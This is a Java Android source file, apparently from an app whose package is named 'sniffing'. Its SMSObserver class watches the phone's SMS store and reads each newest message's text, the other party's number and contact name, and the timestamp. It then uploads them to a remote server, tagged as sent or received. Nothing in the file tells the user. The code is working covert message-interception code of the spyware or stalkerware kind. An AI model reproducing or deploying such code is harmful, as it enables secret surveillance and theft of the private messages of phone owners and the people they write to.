package kr.ssm.sniffing.sms;

import kr.bunobuno.util.TimeRequest;
import kr.ewhapp.kjw.bunobuno.SingletonData;
import kr.ewhapp.kjw.bunobuno.network.NetworkModel;
import kr.ewhapp.kjw.bunobuno.network.NetworkRequest;
import kr.ewhapp.kjw.bunobuno.network.PostNetworkRequest;
import kr.ewhapp.kjw.bunobuno.network.PostNetworkRequest.OnPostMethodProcessListener;
import kr.ssm.sniffing.calling.CallerInfo;
import kr.ssm.sniffing.userinfo.UserData;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;


public class SMSObserver extends ContentObserver {

	NetworkRequest request;
	
	Context mContext;
	
	static final Uri SMS_STATUS_URI = Uri.parse("content://sms");

	public SMSObserver(Handler handler, Context context) {
		super(handler);
		mContext = context;
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Log.e("Info", "Notification on SMS observer");
		Cursor sms_sent_cursor = mContext.getContentResolver().query(SMS_STATUS_URI, null, null, null, null);
		
		if (sms_sent_cursor != null) {
			if (sms_sent_cursor.moveToFirst()) {
				long time = sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"));
				String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
                
//				Log.e("Info","Rep Path Present : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("reply_path_present")));
				UserData smsData = new UserData();
				smsData.phoneNumber = SingletonData.getInstance().getUserData().phoneNumber;
				smsData.contents = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")).trim();
				smsData.otherNumber = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")).trim();
				smsData.date = TimeRequest.getCurrentDate(time);
				smsData.otherName = CallerInfo.getCallerName(mContext, smsData.otherNumber);
				
				//protocol이 null인 경우엔 발신인 경우
                if(protocol == null) {
                	int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
	                if(type == 2){
						sendToServer("SMSSend", smsData);
	                }
                } else 
					sendToServer("SMSRecv", smsData);
			}
		}
	}

	private void sendToServer(String flag, UserData data) {
		SMSNetworkRequest sendSmsRequest = new SMSNetworkRequest(flag, data);
		sendSmsRequest.setOnPostMethodProcessListener(new OnPostMethodProcessListener<UserData>() {

			@Override
			public void onPostMethodProcessSuccess(PostNetworkRequest<UserData> request) {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void onPostMethodProcessError() {
				// TODO Auto-generated method stub
				
			}
		});
		
		NetworkModel.getInstance().sendNetworkData(mContext, sendSmsRequest);
		
	}

	
}
